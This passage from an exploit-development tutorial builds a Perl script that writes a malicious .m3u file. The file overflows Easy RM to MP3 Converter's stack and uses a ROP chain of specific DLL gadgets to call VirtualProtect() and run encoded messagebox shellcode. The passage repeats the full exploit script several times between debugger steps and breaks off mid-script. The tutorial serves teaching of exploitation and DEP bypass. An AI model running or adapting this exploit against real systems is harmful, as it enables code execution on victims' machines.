# ADD ESP,20 # RETN   [Module : MSRMfilter03.dll]\nSo far, our exploit script looks this :\n#------------------------------------------------------------\n#ROP based exploit for Easy RM to MP3 Converter\n#written by corelanc0d3r - http:\/\/www.corelan.be\n#------------------------------------------------------------\nmy $file= \"rop.m3u\";\nmy $buffersize = 26094;\nmy $junk = \"Z\" x $buffersize;\nmy $eip=pack('V',0x100102DC); #return to stack\nmy $junk2 = \"AAAA\"; #compensate\n#------Put stack pointer in EDI & EAX------------------------#\nmy $rop=pack('V',0x5AD79277);  #PUSH ESP, POP EDI\n$rop = $rop.pack('V',0x77C1E842); #PUSH EDI, POP EAX\n$rop=$rop.\"AAAA\"; #compensate for POP EBP\n#stack pointer is now in EAX & EDI, now jump over parameters\n$rop=$rop.pack('V',0x1001653D);  #ADD ESP,20\n#-------Parameters for VirtualProtect()----------------------#\nmy $params=pack('V',0x7C801AD4);          #VirtualProtect()\n$params = $params.\"WWWW\";   #return address (param1)\n$params = $params.\"XXXX\";   #lpAddress      (param2)\n$params = $params.\"YYYY\";   #Size           (param3)\n$params = $params.\"ZZZZ\";   #flNewProtect   (param4)\n$params = $params.pack('V',0x10035005);  #writeable address\n$params=$params.(\"H\" x 8);  #padding\n# ADD ESP,20 + RET will land here\n#\nmy $rop2 = \"JJJJ\";\n#\nmy $nops = \"\\x90\" x 240;\n#\n#\n# .\/msfpayload windows\/messagebox\n#  TITLE=CORELAN TEXT=\"rop test by corelanc0d3r\" R\n# | .\/msfencode -e x86\/alpha_mixed -t perl\nmy $shellcode =\n\"\\x89\\xe0\\xda\\xcf\\xd9\\x70\\xf4\\x5a\\x4a\\x4a\\x4a\\x4a\\x4a\\x4a\" .\n\"\\x4a\\x4a\\x4a\\x4a\\x4a\\x43\\x43\\x43\\x43\\x43\\x43\\x37\\x52\\x59\" .\n\"\\x6a\\x41\\x58\\x50\\x30\\x41\\x30\\x41\\x6b\\x41\\x41\\x51\\x32\\x41\" .\n\"\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\\x42\" .\n\"\\x75\\x4a\\x49\\x48\\x59\\x48\\x6b\\x4f\\x6b\\x48\\x59\\x43\\x44\\x51\" .\n\"\\x34\\x4c\\x34\\x50\\x31\\x48\\x52\\x4f\\x42\\x42\\x5a\\x46\\x51\\x49\" .\n\"\\x59\\x45\\x34\\x4e\\x6b\\x51\\x61\\x44\\x70\\x4e\\x6b\\x43\\x46\\x46\" .\n\"\\x6c\\x4c\\x4b\\x42\\x56\\x45\\x4c\\x4c\\x4b\\x42\\x66\\x43\\x38\\x4c\" .\n\"\\x4b\\x51\\x6e\\x45\\x70\\x4e\\x6b\\x50\\x36\\x44\\x78\\x42\\x6f\\x45\" .\n\"\\x48\\x44\\x35\\x4c\\x33\\x50\\x59\\x43\\x31\\x4a\\x71\\x4b\\x4f\\x48\" .\n\"\\x61\\x43\\x50\\x4c\\x4b\\x50\\x6c\\x51\\x34\\x46\\x44\\x4e\\x6b\\x47\" .\n\"\\x35\\x45\\x6c\\x4c\\x4b\\x42\\x74\\x43\\x35\\x42\\x58\\x46\\x61\\x48\" .\n\"\\x6a\\x4e\\x6b\\x51\\x5a\\x45\\x48\\x4e\\x6b\\x42\\x7a\\x47\\x50\\x47\" .\n\"\\x71\\x48\\x6b\\x4a\\x43\\x45\\x67\\x42\\x69\\x4e\\x6b\\x47\\x44\\x4e\" .\n\"\\x6b\\x46\\x61\\x48\\x6e\\x46\\x51\\x49\\x6f\\x45\\x61\\x49\\x50\\x49\" .\n\"\\x6c\\x4e\\x4c\\x4d\\x54\\x49\\x50\\x50\\x74\\x45\\x5a\\x4b\\x71\\x48\" .\n\"\\x4f\\x44\\x4d\\x47\\x71\\x4b\\x77\\x48\\x69\\x48\\x71\\x49\\x6f\\x49\" .\n\"\\x6f\\x4b\\x4f\\x45\\x6b\\x43\\x4c\\x47\\x54\\x44\\x68\\x51\\x65\\x49\" .\n\"\\x4e\\x4e\\x6b\\x50\\x5a\\x45\\x74\\x46\\x61\\x48\\x6b\\x50\\x66\\x4e\" .\n\"\\x6b\\x46\\x6c\\x50\\x4b\\x4c\\x4b\\x51\\x4a\\x45\\x4c\\x45\\x51\\x4a\" .\n\"\\x4b\\x4e\\x6b\\x43\\x34\\x4c\\x4b\\x43\\x31\\x4a\\x48\\x4d\\x59\\x42\" .\n\"\\x64\\x51\\x34\\x47\\x6c\\x45\\x31\\x4f\\x33\\x4f\\x42\\x47\\x78\\x44\" .\n\"\\x69\\x49\\x44\\x4f\\x79\\x4a\\x45\\x4e\\x69\\x4a\\x62\\x43\\x58\\x4e\" .\n\"\\x6e\\x42\\x6e\\x44\\x4e\\x48\\x6c\\x43\\x62\\x4a\\x48\\x4d\\x4c\\x4b\" .\n\"\\x4f\\x4b\\x4f\\x49\\x6f\\x4d\\x59\\x42\\x65\\x43\\x34\\x4f\\x4b\\x51\" .\n\"\\x6e\\x48\\x58\\x48\\x62\\x43\\x43\\x4e\\x67\\x47\\x6c\\x45\\x74\\x43\" .\n\"\\x62\\x49\\x78\\x4e\\x6b\\x4b\\x4f\\x4b\\x4f\\x49\\x6f\\x4f\\x79\\x50\" .\n\"\\x45\\x45\\x58\\x42\\x48\\x50\\x6c\\x42\\x4c\\x51\\x30\\x4b\\x4f\\x51\" .\n\"\\x78\\x50\\x33\\x44\\x72\\x44\\x6e\\x51\\x74\\x50\\x68\\x42\\x55\\x50\" .\n\"\\x73\\x42\\x45\\x42\\x52\\x4f\\x78\\x43\\x6c\\x47\\x54\\x44\\x4a\\x4c\" .\n\"\\x49\\x4d\\x36\\x50\\x56\\x4b\\x4f\\x43\\x65\\x47\\x74\\x4c\\x49\\x48\" .\n\"\\x42\\x42\\x70\\x4f\\x4b\\x49\\x38\\x4c\\x62\\x50\\x4d\\x4d\\x6c\\x4e\" .\n\"\\x67\\x45\\x4c\\x44\\x64\\x51\\x42\\x49\\x78\\x51\\x4e\\x49\\x6f\\x4b\" .\n\"\\x4f\\x49\\x6f\\x42\\x48\\x42\\x6c\\x43\\x71\\x42\\x6e\\x50\\x58\\x50\" .\n\"\\x68\\x47\\x33\\x42\\x6f\\x50\\x52\\x43\\x75\\x45\\x61\\x4b\\x6b\\x4e\" .\n\"\\x68\\x51\\x4c\\x47\\x54\\x47\\x77\\x4d\\x59\\x4b\\x53\\x50\\x68\\x51\" .\n\"\\x48\\x47\\x50\\x51\\x30\\x51\\x30\\x42\\x48\\x50\\x30\\x51\\x74\\x50\" .\n\"\\x33\\x50\\x72\\x45\\x38\\x42\\x4c\\x45\\x31\\x50\\x6e\\x51\\x73\\x43\" .\n\"\\x58\\x50\\x63\\x50\\x6f\\x43\\x42\\x50\\x65\\x42\\x48\\x47\\x50\\x43\" .\n\"\\x52\\x43\\x49\\x51\\x30\\x51\\x78\\x43\\x44\\x42\\x45\\x51\\x63\\x50\" .\n\"\\x74\\x45\\x38\\x44\\x32\\x50\\x6f\\x42\\x50\\x51\\x30\\x46\\x51\\x48\" .\n\"\\x49\\x4c\\x48\\x42\\x6c\\x47\\x54\\x44\\x58\\x4d\\x59\\x4b\\x51\\x46\" .\n\"\\x51\\x48\\x52\\x51\\x42\\x46\\x33\\x50\\x51\\x43\\x62\\x49\\x6f\\x4e\" .\n\"\\x30\\x44\\x71\\x49\\x50\\x50\\x50\\x4b\\x4f\\x50\\x55\\x45\\x58\\x45\" .\n\"\\x5a\\x41\\x41\";\nmy $rest = \"C\" x 300;\nmy $payload = $junk.$eip.$junk2.$rop.$params.$rop2.$nops.$shellcode.$rest;\nprint \"Payload size : \".length($payload).\"n\";\nprint \"Shellcode size : \".length($shellcode).\"n\";\nopen($FILE,\">$file\");\nprint $FILE $payload;\nclose($FILE);\nprint \"m3u File $file Created successfullyn\";\nCreate the m3u file, attach Immunity to the application, set a\nbreakpoint at 0x100102DC, open the file and wait until the breakpoint\nis hit.\nWhen the breakpoint is hit, look at the stack. You should see your mini\nrop-chain, followed by the pointer to VirtualProtect and its parameters\n(placeholders), and then the location where we should end up after\nmodifying ESP :\n[153]image\nStep through the instructions and watch EAX, EDI and ESP closely. You\nshould see that ESP is pushed onto the stack, placed into EDI. Then EDI\nis pushed onto the stack and picked up in EAX. Finally 0x20 bytes are\nadded to ESP and RET will put 4A4A4A4A in EIP (JJJJ = my $rop2)\nGot that ?  Let\u2019s continue.\nStage 2 : crafting the first parameter (return address)\nWe will now work on generating the first parameter and overwriting the\nplaceholder for the first parameter on the stack.\nThe first parameter needs to point to the shellcode. This parameter\nwill be used as return address for the VirtualProtect() function so,\nwhen the function has marked the page as executable, it would\nautomatically jump to it.\nWhere is our shellcode ?  Well, scroll down in the stack view. Right\nafter the nops, you will see the shellcode.\nThe plan is to use EAX or EDI (both contain a value on the stack), and\nincrease that, leaving enough room for future rop gadgets, so it would\npoint to the nops \/ shellcode.\n(You can play with the size of the nops to make sure the altered value\nwill always point at the nops\/shellcode, so it should be pretty\ngeneric)\nChanging the value is as easy as adding bytes to the register. Suppose\nwe want to use EAX, we can look for rop gadgets that would do ADD EAX,\n+ RET\nA possible gadget would be :\n0x1002DC4C :  # ADD EAX,100 # POP EBP # RETN   [Module : MSRMfilter03.dll]\nThis would increase EAX with 0x100.  One increase should be enough\n(0x100 = 256 bytes). And if it is not enough, we can insert another add\nlater on.\nNext, we need to write this value onto the stack, overwriting the\nplaceholder (which currently contains \"WWWW\" or 57575757).\nHow can we do this ?\nThe easiest way is to look for a pointer to MOV DWORD PTR\nDS:[register],EAX.  If we can make [register] point to the address\nwhere the placeholder is located, then we would end up overwriting that\nlocation with the contents of EAX ( = pointer to the shellcode)\nA possible pointer would be this one :\n0x77E84115 :  # MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN   [\nModule : RPCRT4.dll]\nIn order to make this work, we have to put a pointer to the\nplaceholder-0x10  into ESI. After the value was written, we\u2019ll have the\npointer to the placeholder in EAX (MOV EAX,ESI) which is good\u2026 we might\nbe able to re-use it later on.  Next, we need to insert some padding to\ncompensate for the POP ESI instruction.\nTip : get yourself a copy of [154]UnxUtils (port of the most\nimportant GNU utilities, for Win32). That way can use cat & grep to\nlook for good gadgets :\ncat rop.txt | grep \"MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI\"\n(don\u2019t forget the backslash between :  and [ )\nBut before we can use this instruction, we have to put the right value\ninto ESI.  We have a pointer to the stack in EDI and EAX. EAX will\nalready be used\/changed (pointer to shellcode, remember), so we should\ntry to put EDI into ESI and then alter it a bit so it points at\nparameter_1_placeholder \u2013 0x10 :\n0x763C982F :  # XCHG ESI,EDI # DEC ECX # RETN 4   [Module : comdlg32.dll]\nPutting these 3 things together, our first real rop chain will look\nlike this :\nPut EDI into ESI (and increase it, if necessary, so it would point at\nplaceholder1), change the value in EAX so it would point at the\nshellcode, and then overwrite the placeholder.\n(Note : For the first overwrite operation, ESI will automatically point\nto the right location, so no need to increase or decrease the value.\nESI+10 will point at the location of the first parameter placeholder)\nIn between the gadgets, we\u2019ll need to compensate for additional POP\u2019s\nand RETN4.\nAfter putting things together, this is what the sploit script looks\nlike so far :\n#------------------------------------------------------------\n#ROP based exploit for Easy RM to MP3 Converter\n#written by corelanc0d3r - http:\/\/www.corelan.be\n#------------------------------------------------------------\nmy $file= \"rop.m3u\";\nmy $buffersize = 26094;\nmy $junk = \"Z\" x $buffersize;\nmy $eip=pack('V',0x100102DC); #return to stack\nmy $junk2 = \"AAAA\"; #compensate\n#------Put stack pointer in EDI & EAX------------------------#\nmy $rop=pack('V',0x5AD79277);  #PUSH ESP, POP EDI\n$rop = $rop.pack('V',0x77C1E842); #PUSH EDI, POP EAX\n$rop=$rop.\"AAAA\"; #compensate for POP EBP\n#stack pointer is now in EAX & EDI, now jump over parameters\n$rop=$rop.pack('V',0x1001653D);  #ADD ESP,20\n#-------Parameters for VirtualProtect()----------------------#\nmy $params=pack('V',0x7C801AD4);          #VirtualProtect()\n$params = $params.\"WWWW\";   #return address (param1)\n$params = $params.\"XXXX\";   #lpAddress      (param2)\n$params = $params.\"YYYY\";   #Size           (param3)\n$params = $params.\"ZZZZ\";   #flNewProtect   (param4)\n$params = $params.pack('V',0x10035005);  #writeable address\n$params=$params.(\"H\" x 8);  #padding\n# ADD ESP,20 + RET will land here\n# change ESI so it points to correct location\n# to write first parameter (return address)\nmy $rop2= pack('V',0x763C982F);  # XCHG ESI,EDI # DEC ECX # RETN 4\n#-----Make eax point at shellcode--------------------------\n$rop2=$rop2.pack('V',0x1002DC4C);  #ADD EAX,100 # POP EBP\n$rop2=$rop2.\"AAAA\"; #padding - compensate for RETN4 before\n$rop2=$rop2.\"AAAA\"; #padding\n#----------------------------------------------------------\n#return address is in EAX - write parameter 1\n$rop2=$rop2.pack('V',0x77E84115);\n$rop2=$rop2.\"AAAA\"; #padding\n#\nmy $nops = \"\\x90\" x 240;\n#\n# .\/msfpayload windows\/messagebox\n#  TITLE=CORELAN TEXT=\"rop test by corelanc0d3r\" R\n# | .\/msfencode -e x86\/alpha_mixed -t perl\nmy $shellcode =\n\"\\x89\\xe0\\xda\\xcf\\xd9\\x70\\xf4\\x5a\\x4a\\x4a\\x4a\\x4a\\x4a\\x4a\" .\n\"\\x4a\\x4a\\x4a\\x4a\\x4a\\x43\\x43\\x43\\x43\\x43\\x43\\x37\\x52\\x59\" .\n\"\\x6a\\x41\\x58\\x50\\x30\\x41\\x30\\x41\\x6b\\x41\\x41\\x51\\x32\\x41\" .\n\"\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\\x42\" .\n\"\\x75\\x4a\\x49\\x48\\x59\\x48\\x6b\\x4f\\x6b\\x48\\x59\\x43\\x44\\x51\" .\n\"\\x34\\x4c\\x34\\x50\\x31\\x48\\x52\\x4f\\x42\\x42\\x5a\\x46\\x51\\x49\" .\n\"\\x59\\x45\\x34\\x4e\\x6b\\x51\\x61\\x44\\x70\\x4e\\x6b\\x43\\x46\\x46\" .\n\"\\x6c\\x4c\\x4b\\x42\\x56\\x45\\x4c\\x4c\\x4b\\x42\\x66\\x43\\x38\\x4c\" .\n\"\\x4b\\x51\\x6e\\x45\\x70\\x4e\\x6b\\x50\\x36\\x44\\x78\\x42\\x6f\\x45\" .\n\"\\x48\\x44\\x35\\x4c\\x33\\x50\\x59\\x43\\x31\\x4a\\x71\\x4b\\x4f\\x48\" .\n\"\\x61\\x43\\x50\\x4c\\x4b\\x50\\x6c\\x51\\x34\\x46\\x44\\x4e\\x6b\\x47\" .\n\"\\x35\\x45\\x6c\\x4c\\x4b\\x42\\x74\\x43\\x35\\x42\\x58\\x46\\x61\\x48\" .\n\"\\x6a\\x4e\\x6b\\x51\\x5a\\x45\\x48\\x4e\\x6b\\x42\\x7a\\x47\\x50\\x47\" .\n\"\\x71\\x48\\x6b\\x4a\\x43\\x45\\x67\\x42\\x69\\x4e\\x6b\\x47\\x44\\x4e\" .\n\"\\x6b\\x46\\x61\\x48\\x6e\\x46\\x51\\x49\\x6f\\x45\\x61\\x49\\x50\\x49\" .\n\"\\x6c\\x4e\\x4c\\x4d\\x54\\x49\\x50\\x50\\x74\\x45\\x5a\\x4b\\x71\\x48\" .\n\"\\x4f\\x44\\x4d\\x47\\x71\\x4b\\x77\\x48\\x69\\x48\\x71\\x49\\x6f\\x49\" .\n\"\\x6f\\x4b\\x4f\\x45\\x6b\\x43\\x4c\\x47\\x54\\x44\\x68\\x51\\x65\\x49\" .\n\"\\x4e\\x4e\\x6b\\x50\\x5a\\x45\\x74\\x46\\x61\\x48\\x6b\\x50\\x66\\x4e\" .\n\"\\x6b\\x46\\x6c\\x50\\x4b\\x4c\\x4b\\x51\\x4a\\x45\\x4c\\x45\\x51\\x4a\" .\n\"\\x4b\\x4e\\x6b\\x43\\x34\\x4c\\x4b\\x43\\x31\\x4a\\x48\\x4d\\x59\\x42\" .\n\"\\x64\\x51\\x34\\x47\\x6c\\x45\\x31\\x4f\\x33\\x4f\\x42\\x47\\x78\\x44\" .\n\"\\x69\\x49\\x44\\x4f\\x79\\x4a\\x45\\x4e\\x69\\x4a\\x62\\x43\\x58\\x4e\" .\n\"\\x6e\\x42\\x6e\\x44\\x4e\\x48\\x6c\\x43\\x62\\x4a\\x48\\x4d\\x4c\\x4b\" .\n\"\\x4f\\x4b\\x4f\\x49\\x6f\\x4d\\x59\\x42\\x65\\x43\\x34\\x4f\\x4b\\x51\" .\n\"\\x6e\\x48\\x58\\x48\\x62\\x43\\x43\\x4e\\x67\\x47\\x6c\\x45\\x74\\x43\" .\n\"\\x62\\x49\\x78\\x4e\\x6b\\x4b\\x4f\\x4b\\x4f\\x49\\x6f\\x4f\\x79\\x50\" .\n\"\\x45\\x45\\x58\\x42\\x48\\x50\\x6c\\x42\\x4c\\x51\\x30\\x4b\\x4f\\x51\" .\n\"\\x78\\x50\\x33\\x44\\x72\\x44\\x6e\\x51\\x74\\x50\\x68\\x42\\x55\\x50\" .\n\"\\x73\\x42\\x45\\x42\\x52\\x4f\\x78\\x43\\x6c\\x47\\x54\\x44\\x4a\\x4c\" .\n\"\\x49\\x4d\\x36\\x50\\x56\\x4b\\x4f\\x43\\x65\\x47\\x74\\x4c\\x49\\x48\" .\n\"\\x42\\x42\\x70\\x4f\\x4b\\x49\\x38\\x4c\\x62\\x50\\x4d\\x4d\\x6c\\x4e\" .\n\"\\x67\\x45\\x4c\\x44\\x64\\x51\\x42\\x49\\x78\\x51\\x4e\\x49\\x6f\\x4b\" .\n\"\\x4f\\x49\\x6f\\x42\\x48\\x42\\x6c\\x43\\x71\\x42\\x6e\\x50\\x58\\x50\" .\n\"\\x68\\x47\\x33\\x42\\x6f\\x50\\x52\\x43\\x75\\x45\\x61\\x4b\\x6b\\x4e\" .\n\"\\x68\\x51\\x4c\\x47\\x54\\x47\\x77\\x4d\\x59\\x4b\\x53\\x50\\x68\\x51\" .\n\"\\x48\\x47\\x50\\x51\\x30\\x51\\x30\\x42\\x48\\x50\\x30\\x51\\x74\\x50\" .\n\"\\x33\\x50\\x72\\x45\\x38\\x42\\x4c\\x45\\x31\\x50\\x6e\\x51\\x73\\x43\" .\n\"\\x58\\x50\\x63\\x50\\x6f\\x43\\x42\\x50\\x65\\x42\\x48\\x47\\x50\\x43\" .\n\"\\x52\\x43\\x49\\x51\\x30\\x51\\x78\\x43\\x44\\x42\\x45\\x51\\x63\\x50\" .\n\"\\x74\\x45\\x38\\x44\\x32\\x50\\x6f\\x42\\x50\\x51\\x30\\x46\\x51\\x48\" .\n\"\\x49\\x4c\\x48\\x42\\x6c\\x47\\x54\\x44\\x58\\x4d\\x59\\x4b\\x51\\x46\" .\n\"\\x51\\x48\\x52\\x51\\x42\\x46\\x33\\x50\\x51\\x43\\x62\\x49\\x6f\\x4e\" .\n\"\\x30\\x44\\x71\\x49\\x50\\x50\\x50\\x4b\\x4f\\x50\\x55\\x45\\x58\\x45\" .\n\"\\x5a\\x41\\x41\";\nmy $rest = \"C\" x 300;\nmy $payload = $junk.$eip.$junk2.$rop.$params.$rop2.$nops.$shellcode.$rest;\nprint \"Payload size : \".length($payload).\"n\";\nprint \"Shellcode size : \".length($shellcode).\"n\";\nopen($FILE,\">$file\");\nprint $FILE $payload;\nclose($FILE);\nprint \"m3u File $file Created successfullyn\";\nLet\u2019s step through in the debugger and see what happens after add\nesp,20 + ret is executed :\nret returns to 0x763C982F (which puts EDI into ESI).\nAt this time, the registers look like this :\n[155]image\n(EAX and ESI now point to the saved address on the stack)\nThis gadget returns to 0x1002DC4C, which will add 0x100 bytes to EAX.\nThis will increase the value in EAX to 0010F834, which points to the\nnops before the shellcode :\n[156]image\nThis gadget will return to 0x77E84115, which will perform the following\ninstructions :\n[157]image\n1. It will write EAX (=0x0010F834) into the address contained in ESI, +\n0x10.  ESI currently contains 0x0010F734.  At ESI+10 (0x0010F744), we\nhave the placeholder for the return address :\n[158]image\nWhen the mov instruction is executed, we have successfully written our\nreturn address (pointer to nops) as parameter to the VirtualProtect()\nfunction :\n[159]image\n2. ESI will be saved in EAX, and some data from the stack is saved into\nESI.\nStage 3 : crafting the second parameter (lpAddress)\nThe second parameter needs to point at the location that needs to be\nmarked executable. We will simply use the same pointer as the one used\nfor the first parameter.\nThis means that we can \u2013 more or less \u2013 repeat the entire sequence from\nstage 2, but before we can do this, we need to reset our start values.\nAt the current time, EAX still holds the initial saved stack pointer.\nWe have to put it back in ESI. So we have to find a gadget that would\ndo something like this : PUSH EAX, POP ESI, RET\n0x775D131E :  # PUSH EAX # POP ESI # RETN   [Module : ole32.dll]\nThen, we have to increase the value in EAX again (add 0x100). We can\nuse the same gadget as the one used to generate the value for parameter\n1 again : 0x1002DC4C (ADD EAX,100 # POP EBP # RET)\nFinally, we have to increase the value in ESI with 4 bytes, to make\nsure it will point to the next parameter. All we need is ADD ESI,4 +\nRET, or 4 times  INC ESI, RET\nI will use\n0x77157D1D :  # INC ESI # RETN   [Module : OLEAUT32.dll]\n(4 times).\nSo, the updated sploit script will now look like this :\n#------------------------------------------------------------\n#ROP based exploit for Easy RM to MP3 Converter\n#written by corelanc0d3r - http:\/\/www.corelan.be\n#------------------------------------------------------------\nmy $file= \"rop.m3u\";\nmy $buffersize = 26094;\nmy $junk = \"Z\" x $buffersize;\nmy $eip=pack('V',0x100102DC); #return to stack\nmy $junk2 = \"AAAA\"; #compensate\n#------Put stack pointer in EDI & EAX------------------------#\nmy $rop=pack('V',0x5AD79277);  #PUSH ESP, POP EDI\n$rop = $rop.pack('V',0x77C1E842); #PUSH EDI, POP EAX\n$rop=$rop.\"AAAA\"; #compensate for POP EBP\n#stack pointer is now in EAX & EDI, now jump over parameters\n$rop=$rop.pack('V',0x1001653D);  #ADD ESP,20\n#-------Parameters for VirtualProtect()----------------------#\nmy $params=pack('V',0x7C801AD4);          #VirtualProtect()\n$params = $params.\"WWWW\";   #return address (param1)\n$params = $params.\"XXXX\";   #lpAddress      (param2)\n$params = $params.\"YYYY\";   #Size           (param3)\n$params = $params.\"ZZZZ\";   #flNewProtect   (param4)\n$params = $params.pack('V',0x10035005);  #writeable address\n$params=$params.(\"H\" x 8);  #padding\n# ADD ESP,20 + RET will land here\n# change ESI so it points to correct location\n# to write first parameter (return address)\nmy $rop2= pack('V',0x763C982F);  # XCHG ESI,EDI # DEC ECX # RETN 4\n#-----Make eax point at shellcode--------------------------\n$rop2=$rop2.pack('V',0x1002DC4C);  #ADD EAX,100 # POP EBP\n$rop2=$rop2.\"AAAA\"; #padding - compensate for RETN4 before\n$rop2=$rop2.\"AAAA\"; #padding\n#----------------------------------------------------------\n#return address is in EAX - write parameter 1\n$rop2=$rop2.pack('V',0x77E84115);\n$rop2=$rop2.\"AAAA\"; #padding\n#EAX now contains stack pointer\n#save it back to ESI first\n$rop2=$rop2.pack('V',0x775D131E);  # PUSH EAX # POP ESI # RETN\n#-----Make eax point at shellcode (again)--------------------------\n$rop2=$rop2.pack('V',0x1002DC4C);  #ADD EAX,100 # POP EBP\n$rop2=$rop2.\"AAAA\"; #padding\n#increase ESI with 4\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n#and write lpAddress (param 2)\n$rop2=$rop2.pack('V',0x77E84115);\n$rop2=$rop2.\"AAAA\"; #padding\n#\nmy $nops = \"\\x90\" x 240;\n#\n# .\/msfpayload windows\/messagebox\n#  TITLE=CORELAN TEXT=\"rop test by corelanc0d3r\" R\n# | .\/msfencode -e x86\/alpha_mixed -t perl\nmy $shellcode =\n\"\\x89\\xe0\\xda\\xcf\\xd9\\x70\\xf4\\x5a\\x4a\\x4a\\x4a\\x4a\\x4a\\x4a\" .\n\"\\x4a\\x4a\\x4a\\x4a\\x4a\\x43\\x43\\x43\\x43\\x43\\x43\\x37\\x52\\x59\" .\n\"\\x6a\\x41\\x58\\x50\\x30\\x41\\x30\\x41\\x6b\\x41\\x41\\x51\\x32\\x41\" .\n\"\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\\x42\" .\n\"\\x75\\x4a\\x49\\x48\\x59\\x48\\x6b\\x4f\\x6b\\x48\\x59\\x43\\x44\\x51\" .\n\"\\x34\\x4c\\x34\\x50\\x31\\x48\\x52\\x4f\\x42\\x42\\x5a\\x46\\x51\\x49\" .\n\"\\x59\\x45\\x34\\x4e\\x6b\\x51\\x61\\x44\\x70\\x4e\\x6b\\x43\\x46\\x46\" .\n\"\\x6c\\x4c\\x4b\\x42\\x56\\x45\\x4c\\x4c\\x4b\\x42\\x66\\x43\\x38\\x4c\" .\n\"\\x4b\\x51\\x6e\\x45\\x70\\x4e\\x6b\\x50\\x36\\x44\\x78\\x42\\x6f\\x45\" .\n\"\\x48\\x44\\x35\\x4c\\x33\\x50\\x59\\x43\\x31\\x4a\\x71\\x4b\\x4f\\x48\" .\n\"\\x61\\x43\\x50\\x4c\\x4b\\x50\\x6c\\x51\\x34\\x46\\x44\\x4e\\x6b\\x47\" .\n\"\\x35\\x45\\x6c\\x4c\\x4b\\x42\\x74\\x43\\x35\\x42\\x58\\x46\\x61\\x48\" .\n\"\\x6a\\x4e\\x6b\\x51\\x5a\\x45\\x48\\x4e\\x6b\\x42\\x7a\\x47\\x50\\x47\" .\n\"\\x71\\x48\\x6b\\x4a\\x43\\x45\\x67\\x42\\x69\\x4e\\x6b\\x47\\x44\\x4e\" .\n\"\\x6b\\x46\\x61\\x48\\x6e\\x46\\x51\\x49\\x6f\\x45\\x61\\x49\\x50\\x49\" .\n\"\\x6c\\x4e\\x4c\\x4d\\x54\\x49\\x50\\x50\\x74\\x45\\x5a\\x4b\\x71\\x48\" .\n\"\\x4f\\x44\\x4d\\x47\\x71\\x4b\\x77\\x48\\x69\\x48\\x71\\x49\\x6f\\x49\" .\n\"\\x6f\\x4b\\x4f\\x45\\x6b\\x43\\x4c\\x47\\x54\\x44\\x68\\x51\\x65\\x49\" .\n\"\\x4e\\x4e\\x6b\\x50\\x5a\\x45\\x74\\x46\\x61\\x48\\x6b\\x50\\x66\\x4e\" .\n\"\\x6b\\x46\\x6c\\x50\\x4b\\x4c\\x4b\\x51\\x4a\\x45\\x4c\\x45\\x51\\x4a\" .\n\"\\x4b\\x4e\\x6b\\x43\\x34\\x4c\\x4b\\x43\\x31\\x4a\\x48\\x4d\\x59\\x42\" .\n\"\\x64\\x51\\x34\\x47\\x6c\\x45\\x31\\x4f\\x33\\x4f\\x42\\x47\\x78\\x44\" .\n\"\\x69\\x49\\x44\\x4f\\x79\\x4a\\x45\\x4e\\x69\\x4a\\x62\\x43\\x58\\x4e\" .\n\"\\x6e\\x42\\x6e\\x44\\x4e\\x48\\x6c\\x43\\x62\\x4a\\x48\\x4d\\x4c\\x4b\" .\n\"\\x4f\\x4b\\x4f\\x49\\x6f\\x4d\\x59\\x42\\x65\\x43\\x34\\x4f\\x4b\\x51\" .\n\"\\x6e\\x48\\x58\\x48\\x62\\x43\\x43\\x4e\\x67\\x47\\x6c\\x45\\x74\\x43\" .\n\"\\x62\\x49\\x78\\x4e\\x6b\\x4b\\x4f\\x4b\\x4f\\x49\\x6f\\x4f\\x79\\x50\" .\n\"\\x45\\x45\\x58\\x42\\x48\\x50\\x6c\\x42\\x4c\\x51\\x30\\x4b\\x4f\\x51\" .\n\"\\x78\\x50\\x33\\x44\\x72\\x44\\x6e\\x51\\x74\\x50\\x68\\x42\\x55\\x50\" .\n\"\\x73\\x42\\x45\\x42\\x52\\x4f\\x78\\x43\\x6c\\x47\\x54\\x44\\x4a\\x4c\" .\n\"\\x49\\x4d\\x36\\x50\\x56\\x4b\\x4f\\x43\\x65\\x47\\x74\\x4c\\x49\\x48\" .\n\"\\x42\\x42\\x70\\x4f\\x4b\\x49\\x38\\x4c\\x62\\x50\\x4d\\x4d\\x6c\\x4e\" .\n\"\\x67\\x45\\x4c\\x44\\x64\\x51\\x42\\x49\\x78\\x51\\x4e\\x49\\x6f\\x4b\" .\n\"\\x4f\\x49\\x6f\\x42\\x48\\x42\\x6c\\x43\\x71\\x42\\x6e\\x50\\x58\\x50\" .\n\"\\x68\\x47\\x33\\x42\\x6f\\x50\\x52\\x43\\x75\\x45\\x61\\x4b\\x6b\\x4e\" .\n\"\\x68\\x51\\x4c\\x47\\x54\\x47\\x77\\x4d\\x59\\x4b\\x53\\x50\\x68\\x51\" .\n\"\\x48\\x47\\x50\\x51\\x30\\x51\\x30\\x42\\x48\\x50\\x30\\x51\\x74\\x50\" .\n\"\\x33\\x50\\x72\\x45\\x38\\x42\\x4c\\x45\\x31\\x50\\x6e\\x51\\x73\\x43\" .\n\"\\x58\\x50\\x63\\x50\\x6f\\x43\\x42\\x50\\x65\\x42\\x48\\x47\\x50\\x43\" .\n\"\\x52\\x43\\x49\\x51\\x30\\x51\\x78\\x43\\x44\\x42\\x45\\x51\\x63\\x50\" .\n\"\\x74\\x45\\x38\\x44\\x32\\x50\\x6f\\x42\\x50\\x51\\x30\\x46\\x51\\x48\" .\n\"\\x49\\x4c\\x48\\x42\\x6c\\x47\\x54\\x44\\x58\\x4d\\x59\\x4b\\x51\\x46\" .\n\"\\x51\\x48\\x52\\x51\\x42\\x46\\x33\\x50\\x51\\x43\\x62\\x49\\x6f\\x4e\" .\n\"\\x30\\x44\\x71\\x49\\x50\\x50\\x50\\x4b\\x4f\\x50\\x55\\x45\\x58\\x45\" 